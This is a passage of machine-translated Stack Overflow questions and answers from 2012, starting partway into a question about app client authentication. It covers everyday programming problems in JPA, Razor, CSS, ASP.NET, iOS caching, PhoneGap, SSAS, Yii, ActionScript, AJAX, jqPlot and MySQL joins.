TLS/SSL 是否解决了这个问题，如果可以，如何解决？我可以要求客户端向我的服务器发送来自受信任机构的证书，从而将身份验证的责任交给受信任的机构。但这在实践中如何运作？假设我生成了自签名证书，我将其添加到服务器信任库中。如何安全地将这些分发给应用用户？

也许我在这里遗漏了一些基本的东西，但是任何能指出我正确方向的东西都会有所帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:13:55.543

一般来说，你不能。应用程序代码是公开的 - 没有什么能阻止坏人对其进行逆向工程并将协议模拟为 tee。更多讨论[在这里](https://stackoverflow.com/questions/4671435/how-to-make-a-secure-login-using-udid-or-device-token/4671678#4671678)。

代码混淆是你最好的选择。特别是在 Android 上，请查看 ProGuard。没有坚如磐石的保证，但也许坏人会失去耐心。:)

# entity-relationship - 两个不同的表是同一实体的一部分

> ID：11052307
> 
> 赞同：0
> 
> 时间：2012-06-15T14:10:46.250
> 
> 标签：entity-relationship, openjpa

我有一个实体需要另一个表中的字段。第二个表基本上是第一个表的扩展，因为它们具有相同的主键......

例如

```
Organization 1:             OrganizationExtension
___________                 _____________________
PK: OrgaID                   PK: OrgID 
```

如何将这两个表放入同一个实体 bean？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:30:01.583

在这里找到答案... [OpenJPA](http://openjpa.apache.org/builds/1.1.0/docs/jpa_overview_mapping_field.html#jpa_overview_mapping_secondary)

基本上你会这样做......

```
@Entity
@Table(name="ART")
@SecondaryTable(name="ART_DATA", 
    pkJoinColumns=@PrimaryKeyJoinColumn(name="ART_ID", referencedColumnName="ID"))
public class Article {

    @Id private long id;

    @Column(table="ART_DATA")
    private byte[] content;

    ...
} 
```

如果您使用的是注释而不是 XML……剩下的唯一问题是如何识别第二个表中的列？

也回答了第二部分...您只需执行以下操作`@Column(table="ORGANIZATION_LINK", name="EVENING_HOURS")`

# asp.net - 当您不知道它的名称时，Razor 使用 RenderSection

> ID：11052308
> 
> 赞同：1
> 
> 时间：2012-06-15T14:10:49.443
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-3, c#-4.0, razor

假设子视图：

```
@Section Section1 {
   @:Section1 Stuff
}

@Section Section2 {
   @:Section2 Stuff
}

@Section ExtraSection {
   @:Extra Section Stuff
} 
```

如何设置主视图，以便 Section1 和 Section2 各归其位，而其余的都以统一的方式处理？（例如像@RenderAllOtherSections()）

```
@RenderSection("Section1")
@RenderSection("Section2")
@RenderBody()
@RenderAllOtherSections() // ExtraSection is rendered here. How? 
```

**更新：**检查剃刀视图网页的基本对象后，我发现有一个字典，其中包含在前一个（调用）视图中定义的部分。它位于`PreviousSectionWriters`参数中，但这有一个私人获取。还有，这个字典其实是栈中的第二项`SectionWritersStack`，但是栈中也有一个私有的get。已经渲染的部分存储为“完成” `HashSet<string> _renderedSections`，这也是私有的。

简而言之，我需要访问的内容`WebPageBase`是：

```
public abstract class WebPageBase : WebPageRenderingBase
{
      private HashSet<string> _renderedSections

      Dictionary<string, SectionWriter> PreviousSectionWriters // private get, its the 2nd item in SectionWritersStack
     Stack<Dictionary<string, SectionWriter>> SectionWritersStack // this would do too, but private get
} 
```

所以现在的问题是，我该怎么做才能访问这些属性？辅助方法`bool IsSectionDefined(string name)`是唯一可以使用的公共可访问的东西，但它并没有真正的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:59:40.370

这是不可能的。如果这样的事情是可能的，母版页将如何理解哪个部分将是第一，第二......等等。？

如果我理解你的情况，你需要在 @RenderBody() Alternativle 之后渲染部分，你可以有这样的东西：

```
Master page
@RenderSection("Section1")
@RenderSection("Section2")
@RenderBody()
@RenderSection("PostBodySection", false) // The second parameter - false means that this section is not mandatory 
```

在子视图中，您可以选择是否在“PostBodySection”中包含任何内容。

# css - 将带有图像的 div 放在带有嵌入视频的另一个 div 之上

> ID：11052309
> 
> 赞同：1
> 
> 时间：2012-06-15T14:10:58.113
> 
> 标签：css, html, video-embedding

我正在尝试制作一个 HTML 页面来循环播放视频的播放列表，其中覆盖了与某些标签相对应的 Twitter 消息。

我认为我可以将它用于 Web 环境，所以我尝试结合 HTML 和 CSS。

我训练使其工作的方法是嵌入一个宽度和高度为 100% 的 WMPlayer 对象，并在该层的顶部放置另一个具有背景的层和一些 PHP 代码来加载推文。

但它根本不起作用......不尝试使用图像，甚至尝试仅使用文本。我认为问题可能在于无法在视频顶部放置任何内容，或者当然，我的代码是错误的。

这里是：

```
html, body {
    height: 100%
}

.video{   
   width: 100%;
   height: 100%;;
   position: relative;
    background: #0f0;
}
.tweets {    
    width:50%;
    height:350px;
    position: absolute;
    top: 0; left: 0;
    background: #f00;
    z-index:100
} 
```

和 HTML：

```
<div class="video">
            <OBJECT id="VIDEO" width="100%" height="100%" 
                CLASSID="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6"
                type="application/x-oleobject">
                    <PARAM NAME="URL" VALUE="http://www.falange.es/videos/video.mp4">
                <PARAM NAME="SendPlayStateChangeEvents" VALUE="True">
                <PARAM NAME="AutoStart" VALUE="True">
                <PARAM name="uiMode" value="none">
                <PARAM name="PlayCount" value="9999">
                <PARAM name="WMode" value="opaque">
                <embed type="application/x-mplayer2" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" 
                name="mediaplayer1" autostart="true" width="100%" height="100%" transparentstart="1" SHOWSTATUSBAR="1" 
                    loop="0" controller="true" src="http://www.falange.es/videos/video.mp4" stretchToFit="true" ></embed>
            </OBJECT>       
            <div class="tweets">
                Tweets here.
            </div>          
        </div> 
```

我究竟做错了什么？

非常感谢您提前。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:19:25.153

你必须给你`<body>`100% 的高度，而不是`<div>`伸展到它的高度 - [http://jsfiddle.net/z5kGQ/](http://jsfiddle.net/z5kGQ/)

```
html, body {
    height: 100%;
}

.video {
   width: 100%;
   height: 100%;
   position: relative;
   background: beige;
}

.tweets {
    width:100%;
    min-height:150px;
    position: absolute;
    top: 0;
    background: orange;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:19:42.267

尝试将 z-index:100 例如放在推文 div 上

```
.tweets {
    z-index:100;
    width:100%;
    min-height:350px;
    position: absolute;
    background: url(img.png) top left no-repeat;
} 
```

从您的对象标签中删除样式标签，如果您可以提供一个带有工作视频和示例文本以覆盖在顶部的jsfiddle，那就太好了。我有一种感觉，当涉及到覆盖时，对象标签将很难处理，但我不能 100% 确定，直到我可以测试它

编辑 - 尝试在对象标签参数中设置 wmode=transparent

```
<PARAM name="WMode" value="transparent"> 
```

# c# - 如何从单独的用户控件获取 FormView 中当前加载项的键？

> ID：11052315
> 
> 赞同：0
> 
> 时间：2012-06-15T14:11:11.333
> 
> 标签：c#, asp.net

我有一个 FormView 从中启动另一个用户控件。

FormView 从数据库中加载一个“订单”。UserControl 包含一个用于为该订单插入行项目的表单。

插入订单项时，我需要订单 ID 将订单项与订单关联。

但是由于子控件是一个单独的用户控件，FormView 是不可见和不可访问的。有谁知道我可以如何从不同的用户控件获取 FormViews 键值？

不幸的是，使用会话或 cookie 是不可能的。

谢谢凯文

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:14:54.450

可能有很多方法可以在控件之间传递值

1.  您可以调用用户控件的公共方法来传递值

2.  您可以使用公共财产

3.  最简单的方法是使用 session 传递值，在获取值后，您可以再次将 null 分配给 session 以获取垃圾收集器重新收集的内存

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:14:58.530

您不能简单地在 UserControl 上拥有一个属性 OrderId 吗？

FormView 可以将此属性设置为当前订单 ID。

# iphone - iOS：是否存在具有 TTL 和最大大小的内存缓存？

> ID：11052316
> 
> 赞同：1
> 
> 时间：2012-06-15T14:11:12.203
> 
> 标签：iphone, objective-c, caching

我的 iOS 应用程序需要一个内存中的通用缓存，它支持在达到最大大小时在生存时间和自动清除元素中提供项目。这样的事情存在吗？

NSCache 不起作用，因为它不支持 TTL。

我正在推出自己的产品，但如果我不必这样做，那就太好了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:23:37.837

`NSCache`您可以在一定的限制后利用清除`setTotalCostLimit:`内存。正如文档所述。

> 默认值为 0，表示对缓存的大小没有限制。如果将对象添加到缓存中，则可以传入对象的指定成本，例如对象的大小（以字节为单位）。如果将此对象添加到缓存中导致缓存的总成本高于 totalCostLimit，则缓存会自动驱逐其一些对象，直到其总成本低于 totalCostLimit。不保证缓存驱逐对象的顺序。这个限制不是一个严格的限制，如果缓存超过限制，缓存中的对象可能会立即被驱逐，在稍后的时间点，或者可能永远不会，这一切都取决于缓存的实现细节。

如果您还没有，您应该查看[Caching and Purgeable Memory](http://developer.apple.com/library/mac/#technotes/CachingPurgeableMemory/Introduction/Introduction.html)文档。

或者，我遇到了一个`NSCache`用 C++ 编写并支持 TTL 的类。您可以在编写自己的文件时很好地将其用作指南，可以在[这里查看](https://subversion.assembla.com/svn/tamu-cs-691-dns-resolver/trunk/DNSv2/NSCache.cpp)

希望这可以帮助 ！

# cordova - 无法在phonegap android平台中执行php文件

> ID：11052318
> 
> 赞同：1
> 
> 时间：2012-06-15T14:11:23.613
> 
> 标签：cordova

我在 Eclipse 中使用 PhoneGap 来尝试编写一些 android 应用程序。完成 PhoneGap hello world 教程后，我决定学习一个稍微复杂一点的教程，我必须先连接到我的本地数据库。

所以我决定首先在 assets/www 目录中使用 index.html 和 db.php。

这是我的 index.html 代码：

```
<?
require('db.php');
require('utils.php');
require('header.php');
?>
    <div  data-role="page">
    <div data-role="header">
    <h1>JQuery</h1>        
    </div>
    <div data-role="content">

<? 
//more thing go here....
?>
    </div>
    <div data-role="footer">
    Footer
    </div>
    </div>
<? require('footer.php'); ?>
</body>
</html> 
```

和 db.php：

```
<?
$mysql_db = "test123";
$mysql_user = "root";
$mysql_link = mysql_connect("localhost", $mysql_user, "");
mysql_select_db($mysql_db, $mysql_link);
echo "display me";  
?> 
```

问题是 db.php 中的**display me**没有显示在我的应用程序的第一页上，这意味着 db.php 文件没有被执行。但是 index.html 显示成功。请帮忙 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:18:03.203

PHP 是一种服务器端技术。为了能够运行 PHP 代码，您的 Web 服务器上需要一个解释器。assets/www 中的所有文件都在 WebView 中加载客户端。WebView 不包含 PHP 解释器，因此您的 PHP 代码将不会运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T20:35:37.190

您可以连接到您的 php 服务器并通过 ajax（与任何其他 Web 浏览器一样）检索数据库信息，也可以使用 phonegap 支持的 sqllite 提供的“本地”数据库。检查 phonegap api 以获取本地数据库或使用本地存储的示例。docs.phonegap.com/en/1.8.1/cordova_storage_storage.md.html

# ssas - 分析服务处理选项

> ID：11052328
> 
> 赞同：1
> 
> 时间：2012-06-15T14:11:49.817
> 
> 标签：ssas

分析服务 Database,Cube,Dimension 中的 process 选项有什么用？如果我们单独处理数据库，它会处理里面的 Cube 和维度，对吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:52:34.213

是的，处理数据库将处理多维数据集和维度。如果它适合您，您应该继续。您可以出于多种原因独立处理其他对象。有时您只想处理不需要多维数据集进程的维度的更新。或者，如果您的服务器无法并行处理处理，您希望以特定顺序控制处理。也许您只想处理数据库中的一个多维数据集而不是数据库中的所有多维数据集，或者您可能希望处理多维数据集中的单个分区而不是整个多维数据集。这些其他选项使您可以准确地决定要处理的内容，是完整的过程还是更新/添加/增量过程，以及处理的顺序，以便您可以适当地管理硬件资源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T19:34:39.783

SSAS 中有许多处理选项。这些存在于各种场景中 - 即测试/开发、登台、生产等......除了处理特定对象之外，您还可以通过多种方式处理选定的对象。[此处](http://msdn.microsoft.com/en-us/library/ms174774.aspx)列出了这些方法，包括以下方法：默认、完整、清除、数据等。此外，您可能会注意到大多数（但不是全部）处理选项都显示在 GUI 中。一些更精细的选项只能通过 XMLA 获得。 [这是](http://msdn.microsoft.com/en-us/library/aa337509)解释不同处理工具的参考。

# jquery - Html.RenderPartial 不产生值

> ID：11052331
> 
> 赞同：4
> 
> 时间：2012-06-15T14:11:53.640
> 
> 标签：jquery, asp.net-mvc-3, razor, vb.net-2010, renderpartial

大家好。

我知道就 MVC 而言这是一个非常基本的问题，但我无法终生得到 @Html.RenderPartial 不给我错误。我正在使用 VB.NET 和 Razor。我在网上找到的大多数示例都是用 c# 编写的，这对我来说并不难转换，但是这个简单的例子让我很难过。这是在我的索引视图中，由 _Layout.vbhtml 呈现：

```
@Section MixPage
    @Html.RenderPartial("_MixScreen", ViewData.Model)
End Section 
```

上面的表达式不产生值。

今天早上我找了很长时间，我从中举例的页面如下：

[http://geekswithblogs.net/blachniet/archive/2011/08/03/walkthrough-updating-partial-views-with-unobtrusive-ajax-in-mvc-3.aspx](http://geekswithblogs.net/blachniet/archive/2011/08/03/walkthrough-updating-partial-views-with-unobtrusive-ajax-in-mvc-3.aspx)

[从控制器内部获取部分视图的 HTML](https://stackoverflow.com/questions/286132/asp-net-mvc-getting-a-partial-views-html-from-inside-of-the-controller)

最终，我要做的是从控制器返回并更新模型到局部视图：

```
 Function UpdateFormulation(model As FormulationModel) As ActionResult
        model.GetCalculation()
        Return PartialView("_MixScreen", model)
    End Function 
```

并且从 javascript 中的表达式调用该控制器：

```
function UpdateResults() {
    jQuery.support.cors = true;
    var theUrl = '/Home/UpdateFormulation/';
    var formulation = getFormulation();
    $.ajax({
        type: "POST",
        url: theUrl,
        contentType: "application/json",
        dataType: "json",
        data: JSON.stringify(formulation),
        success: function (result, textStatus) {
            result = jQuery.parseJSON(result.d);
            if (result.ErrorMessage == null) {
                FillMixScreen(result);
            } else {
                alert(result.ErrorMessage);
            }
        },
        error: function (xhr, result) {
            alert("readyState: " + xhr.readyState + "\nstatus: " + xhr.status);
            alert("responseText: " + xhr.responseText);
        }
    });
} 
```

如果有更好的方法将此更新的模型返回到视图并仅更新此部分视图，我会全力以赴。但是这个问题的前提是：为什么 RenderPartial 不产生值？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-22T05:26:48.917

Html.RenderPartial 直接写入响应；它不返回值。因此，您必须在代码块中使用它。

```
@Section MixPage
    @Code
        @Html.RenderPartial("_MixScreen", ViewData.Model)
    End Code
End Section 
```

您也可以使用不带代码块的 Html.Partial() 来做同样的事情，因为 Partial() 返回一个字符串。

```
@Section MixPage
    @Html.Partial("_MixScreen", ViewData.Model)
End Section 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T15:16:37.773

好吧，来自客户端的问题是您期望`html`客户端中不是 Json，请记住返回视图，基本上您正在返回视图编译，这是`html`将结果中预期的数据类型更改为 html

```
$.ajax({
    type: "POST",
    url: theUrl,
    contentType: "application/json",
    dataType: "html",
    data: JSON.stringify(formulation),
    success: function (result, textStatus) {
        result = jQuery.parseJSON(result.d);
        if (result.ErrorMessage == null) {
            FillMixScreen(result);
        } else {
            alert(result.ErrorMessage);
        }
    },
    error: function (xhr, result) {
        alert("readyState: " + xhr.readyState + "\nstatus: " + xhr.status);
        alert("responseText: " + xhr.responseText);
    }
}); 
```

另外我建议您使用方法[load](http://api.jquery.com/load/)，它是 ajax 的简短版本，并始终假定预期结果是 html 并且它附加到您需要的元素的主体

第二。如果您想从您的布局中加载部分内容，请这样做

```
 //note's that i'm calling the action no the view
 @Html.Action("UpdateFormulation","yourController", new { model = model}) //<--- this is code in c# don't know how is in vb 
```

# php - Yii，在 cgridview 中显示不同的日期格式

> ID：11052332
> 
> 赞同：13
> 
> 时间：2012-06-15T14:11:55.170
> 
> 标签：php, yii

我在 Yii 应用程序中关注了 cgridview，我想更改值的日期格式，

```
'columns'=>array(
        array(
                'name'=>'Date',
                'header'=>'Date',
                'value'=>'$data["work_date"]'
            ), 
```

我想以 dd-mm-yyyy 格式显示日期，目前它显示为 yyyy-mm-dd。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-15T14:13:29.583

试试这个，

```
array(
    'name'=>'Date',
    'header'=>'Date',
    //'value'=>'date("d M Y",strtotime($data["work_date"]))'
    'value'=>'Yii::app()->dateFormatter->format("d MMM y",strtotime($data->date))'
), 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-10-15T11:12:23.783

我想有比其他答案中提出的更优雅的方式来格式化日期（或其他任何内容）。`CGridView`使用[formatter](http://www.yiiframework.com/doc/api/1.1/CGridView#formatter-detail)属性来指定应用程序的[组件来格式化值](http://www.yiiframework.com/doc/api/1.1/CFormatter)。`format`默认情况下。

所以应该`format`像这样在应用程序的配置文件中配置组件：

```
'components' => array(
    ...
    'format' => array(
        'dateFormat' => 'd-m-Y'
    )
) 
```

如果`work_date`已经是 Unix 时间戳，那么将列描述`CGridView`如下就足够了：

```
array(
    'name' => 'work_date',
    'type' => 'date'
) 
```

如果`work_date`就像问题中那样，那么列的数组：

```
array(
    'name' => 'work_date',
    'type' => 'date',
    'value' => 'strtotime($data->work_date)'
) 
```

如果一个自定义字段格式不受[CFormatter](http://www.yiiframework.com/doc/api/1.1/CFormatter)支持，那么很容易通过扩展添加您自己的[类型](http://www.yiiframework.com/doc/api/1.1/CDataColumn#type-detail) ：`custom``CFormatter`

```
class MyFormatter extends CFormatter
{
    public function formatCustom($value)
    {
        // format $value parameter, i.e. make date conversion like in the question:
        return date("d-m-Y", strtotime($value));
    }
} 
```

那么格式组件的配置是：

```
'components' => array(
    ...
    'format' => array(
        'class' => 'MyFormatter'
    )
) 
```

该列是这样描述的：

```
array(
    'name' => 'work_date',
    'type' => 'custom'
) 
```

这样，每次您想要格式化相同类型的字段时，就无需担心[值PHP 表达式。](http://www.yiiframework.com/doc/api/1.1/CDataColumn#value-detail)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-22T15:36:36.927

有（至少）两种选择：

（使用 CGridView/CDetailView 时）您可能希望格式化日期**字符串**（即：mysql 日期时间字段）而不是时间戳。你可以使用这个：

```
array(
    'name' => 'startsOn',
    'format' => 'datetime',
    'value' => 'strtotime($data->startsOn)'
), 
```

或者使用这个：

```
array(
    'name' => 'startsOn',
    'value' => 'Yii::app()->dateFormatter->format("d MMM y", strtotime($data->startsOn))'
), 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-14T07:33:50.213

**对于 Admin.php**

```
array(
        'name'=>'start_date',
        'header'=>'Date',
        'value'=>'date_format(date_create($data->start_date), "d-m-Y ")',
    ), 
```

**对于 View.php**

```
array(
    'name'=>'Date',
    'value'=>date_format(date_create($model->order_date), "d-m-Y "),
    ), 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-12-13T10:07:28.490

我强烈建议创建或更改目标语言的本地化文件，并在您的应用程序中引用它，而不是在不集中格式的情况下为其编写自定义函数。请参阅[https://www.yiiframework.com/doc/guide/1.1/en/topics.i18n](https://www.yiiframework.com/doc/guide/1.1/en/topics.i18n)

```
// Refer our own locale file(s)
Yii::app()->setLocaleDataPath(Yii::getPathOfAlias('application.shared').'/i18n/data/'); 
```

要过滤网格视图中的本地化日期/日期时间列，请参阅我在“重复”问题中的回答：[https ://stackoverflow.com/a/53759001/3090890](https://stackoverflow.com/a/53759001/3090890)

# actionscript-3 - 使用动态变量名

> ID：11052333
> 
> 赞同：1
> 
> 时间：2012-06-15T14:11:56.770
> 
> 标签：actionscript-3

我正在尝试使用 AS3 构建一个小型 Flash 游戏，在其中我将小怪添加到舞台上，将它们存储在一个数组中，以便在它们被杀死后删除。但是我不断收到以下错误：TypeError: Error #2007: Parameter child must be non-null。

这是我目前的代码：

```
myMobsBuilder();
var mobsArray:Array = new Array();

function myMobsBuilder():void{
    for(var i:Number=0; i<3; i++){
        this["myMob"+i+":MovieClip"] = new mob();
    lvlHolder.addChild(this["myMob"+i]);
    myMob.x = 200;
    myMob.y = 200;
    mobsArray[i] = myMobs;
    }
} 
```

请注意，我正在尝试为每个新的暴民实例动态创建一个变量名。将所述暴徒的影片剪辑添加到舞台上另一个名为：lvlHolder 的影片剪辑中，并将其定位。然后将所述影片剪辑添加到数组中。这样一来，一旦暴徒被杀死，我就可以从阵列和舞台上删除它们。当然，除非有更好的方法来做到这一点。我已经广泛研究了以下内容：动态创建变量名称，从数组中添加和删除影片剪辑，这是我能想到的最好的，尽管我对 AS3 还很陌生。

对此的任何帮助将不胜感激。

附言。以下是我在另一个函数中使用的删除代码，但这也不是很好：

```
lvlHolder.removeChild(["myMob"+i]);
mobsArray.splice(i,1); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:15:13.577

目前还不清楚您要做什么。`this["myMob"+i+":MovieClip"] = new mob();`这是无效的（嗯，不是严格*无效*的，但它不会按照你的想法做）。

这应该有效（编辑：改进代码以更好地符合良好的编码标准）：

```
myMobsBuilder();
var mobsArray:Array = [];
//You can also use a vector here, for possibly improved speed and type safety.
//var mobsArray:Vector.<mob> = new Vector.<mob>();

function myMobsBuilder():void{
    for(var i:int=0; i<3; i++)
    {
        var tmpMob:mob = new mob();
        lvlHolder.addChild(tmpMob);
        tmpMob.x = 200;
        tmpMob.y = 200;
        mobsArray.push(tmpMob);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T16:02:08.403

所以，我假设你的循环通过数组？

```
for (var i:int = 0; i < mobsAray.length; i++)
{
    var tempMob:mob = mobsArray[i];
    var j:int;

    if (tempMob is too weak to live) //pseudocode
    {
        //now we know which one to kill

        lvHolder.removeChild(tempMob);
        //remove it from view

        j = i;
        //remember its position in the array
    }

    //you can modify the array outside the loop
    mobsArray.splice(j,1);

    //I assumed that you can kill just one mob at the time
    //but if that's not the case you can store indexes in the array
    //and make another loop to remove these from mobsArray
} 
```

请记住在循环遍历数组时不要修改数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T17:16:35.027

您可能会发现仅使用 Sprite 容器而不是数组更简单/更有效（取决于您的需求以及跟踪每个“暴民”的方式）

```
var mobContainer:Sprite = new Sprite();
lvlHolder.addChild(mobContainer);
var tmpMob:mob;
for(var i:Number=0; i<3; i++){
    tmpMob = new mob();
    mobContainer.addChild(tmpMob);
    tmpMob.x = 200;
    Mob.y = 200;
} 
```

然后对于您的删除代码（如果它发生在 mob 类本身中）只需使用 **this.parent.removeChild(this)**；并像对待数组一样对待精灵。

因此，如果您需要知道有多少 mob 实例，只需使用： **mobContainer.numChildren** （而不是 array.length）和**mobContainer.getChildAt(i)**而不是 array[i]

# javascript - 来自ajax的javascript不会运行

> ID：11052335
> 
> 赞同：0
> 
> 时间：2012-06-15T14:12:00.847
> 
> 标签：javascript, ajax, alert

我有一个 ajaxed 页面，但文档就绪代码将无法运行。我在 IE7 中运行。我没有收到警报，但“页面在这里”显示正常。方法“ajax”是我写的一个实用方法。它适用于我所有的 ajax 调用，所以我知道这不是问题。我只是无法让我的 javascript 运行。为什么我的 javascript 不能运行？

AJAX 页面

```
<script src="Utilities/Javascript/jquery-1.7.1.min.js"></script>
<script type="text/javascript">
        alert("RUN PLEASE");
</script>
Page is here 
```

主页

```
<html>
<head>
<script src="Utilities/Javascript/Utilities.js"></script>
<script src="Utilities/Javascript/jquery-1.7.1.min.js"></script>
</head>
<body>
<script type="text/javascript">
    $(document).ready(function () {
        ajax("scrolltest.aspx", "divy2");
    });
</script>
<div id="divy2">

</div>
</body>
</html> 
```

来自 Utilities.js 的 ajax 方法

```
/*
* Ajax page loads with url and updates element's innerHtml
* @param url : URL to call for ajax page load
* @param element : Element ID to be updated
*/
function ajax(url, element) {
    var ajx;
    if (window.HXMLHttpRequest) {
        ajx = new XMLHttpRequest();
    }
    else {
        ajx = new ActiveXObject("Microsoft.XMLHTTP");
    }
    ajx.open("GET", url, true);
    ajx.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    ajx.onreadystatechange = function () {
        if (ajx.readyState == 4 && ajx.status == 200) {
            document.getElementById(element).innerHTML = ajx.responseText;
        }
        else if (ajx.readyState == 4 && ajx.status == 400) {
            alert("Page Error. Please refresh and try again.");
        }
        else if (ajx.readyState == 4 && ajx.status == 500) {
            alert("Server Error. Please refresh and try again.");
        }
        else if (ajx.readyState == 4) {
            alert(ajx.status + ":" + ajx.statusText);
        }
    }
    ajx.send();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:16:29.363

除非您在其上调用 eval，否则不会处理来自“AJAX”请求的 Javascript - 这并不是最好的主意

编辑这个答案有点太简短了——有办法本地强制执行——参考这个更详细和类似的问题/答案

[如何强制 Javascript 在对 Ajax 请求的 HTML 响应中执行](https://stackoverflow.com/questions/278122/how-to-force-javascript-to-execute-within-html-response-to-ajax-request)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:22:25.640

没有属性的脚本在通过 innerHTML ( [MSDN](http://msdn.microsoft.com/en-us/library/ie/ms533897%28v=vs.85%29.aspx)`defer` )插入时不会被执行。

# javascript - jqPlot 搞砸了动态数组

> ID：11052339
> 
> 赞同：1
> 
> 时间：2012-06-15T14:12:13.500
> 
> 标签：javascript, jquery, jqplot

我有一个通过读取 XML 文件加载的 jqPlot 饼图。但是，当我动态加载切片数组时，饼图无法正确呈现，当我对数组进行硬编码时，它似乎可以正确呈现。

我用来获取数组的代码是：

```
function loadSlices(xml)
{
slices = new Array();
$(xml).find("category").each(
    function()
    {
        $(this).find("slice").each(
            function()
            {
                slice = new Array($(this).attr("name"));
                slice.push($(this).attr("size"));
                slices.push(slice);
            }
        );
    }
);
return slices;
 } 
```

加载图表的代码是：

```
function pieChart(name,xmlurl)
{
$.get(xmlurl,function(xml)
{

    loadSize(name,xml);
    slices= new Array();
    slices.push(loadSlices(xml));
    $("#debug").append("\nSLICES ARR (getting ready to load):");
    debug2dArray(slices);
    //debug2dArray(slices)
    //now load in the pie chart
    var plot1 = $.jqplot(name,[slices],
        {
            seriesDefaults:{
                renderer: $.jqplot.PieRenderer,
                rendererOptions:{
                    showDataLables: true
                },
            }
    });
});//end get AJAX request
 } 
```

当我对 slices 数组进行硬编码时，`[[["PB&J",2],["Ham",1]]]`它工作得非常好。任何帮助，将不胜感激。

## 更新

### XML

```
<chart>
    <size width="450px" height="200px"/>
        <category>
              <slice name="PB&J" size="3" />
              <slice name="Ham"  size="1" />
         </category>
 </chart> 
```

### JSFiddles

[静态数组](http://jsfiddle.net/ZgB79/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:27:38.707

我找到了答案。当我第二次加载它时，它会将嵌入数组中的第二个参数渲染为字符串 so `["PB&J","1"]`，这是 jqPlot 不喜欢的。因此，在整数的推送周围添加一个 parseInt() 会导致正确的显示。要查看修复演示，请参阅[此 jsfiddle](http://jsfiddle.net/ZgB79/1/)。

# mysql - MySQL 加入和计数查询

> ID：11052340
> 
> 赞同：0
> 
> 时间：2012-06-15T14:12:13.983
> 
> 标签：mysql, sql, database

我有两个结构如下的 MySQL 表；

广告

```
+-------------------+--------------+
| Field             | Type         |
+-------------------+--------------+
| id                | int(11)      |
| title             | varchar(150) |
+-------------------+--------------+ 
```

advert_interest_record

```
+--------------+------------+
| Field        | Type       |
+--------------+------------+
| id           | int(11)    | 
| advert_id    | int(11)    |
| message      | longtext   |
+--------------+------------+ 
```

我想从“advert”表中选择所有记录的列表 - 并从“advert_interest_record”表中获取行数，其中 advert.id=response.advert_id。

我用来连接表的 SQL 如下；

```
SELECT advert.id, advert.title 
FROM advert 
LEFT JOIN advert_interest_record ON advert.id = advert_interest_record.advert_id  
GROUP BY advert_interest_record.advert_id 
```

我遇到的第一个问题是，当“advert_interest_record”表中没有记录时，“advert”表中的记录不包含在结果中——我需要它。

我的第二个问题是，我将如何计算“advert_interest_record”表中的行数？

对此的任何建议将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:19:16.703

首先; 您正在从广告表中选择两个字段；同时从 advert_interest_record 表中搜索一个字段。

假设对于所有 advert.id 值， advert.title 值是相同的，它可能会给出正确的结果。

无论如何; 由于您希望广告中的数据处于领先地位，因此最好对您希望唯一返回的该表的字段进行分组（这也有助于获取与另一个表中的记录相关联的记录数）。

例如，您可以查询如下：

```
SELECT a.id, a.title, COUNT(air.id)
FROM advert a
LEFT JOIN advert_interest_records air ON a.id = air.advert_id
GROUP BY a.id, a.title 
```

这将为您提供 advert.id 和 advert.title 的所有唯一组合的结果，以及 advert_interest_records 中与 advert.id 值关联的记录数。

我假设 advert.id 是唯一的，并且每个 id 只出现一次。否则，对 id 和 title 的分组（我相信，与其他 DBMS 相比，MySQL 本身不需要），可能会给你不正确的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:17:18.817

这个怎么样：

```
 SELECT a.title, COUNT(air.id) 
     FROM advert a 
LEFT JOIN advert_interest_record air
       ON a.id = air.advert_id
    GROUP BY a.id 
```

LEFT JOIN 应该保证`advert`表中的所有记录都将包含在最终结果中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:30:02.673

而是按 advert.id 分组，并使用 count() 来计算您的记录。

没有 advert_interest_record 的广告应该返回一个 count() 等于 0。

```
SELECT advert.id, count(advert_interest_record.id) as interestcount
  FROM advert 
  LEFT JOIN advert_interest_record ON advert.id = advert_interest_record.advert_id  
GROUP BY advert.id; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:17:02.797

```
SELECT advert.id, advert.title, count(*) as totalRows 
FROM advert 
LEFT JOIN 
         advert_interest_record ON advert.id = advert_interest_record.advert_id  
GROUP BY advert.id, advert.title 
```

关于查询的一些说明

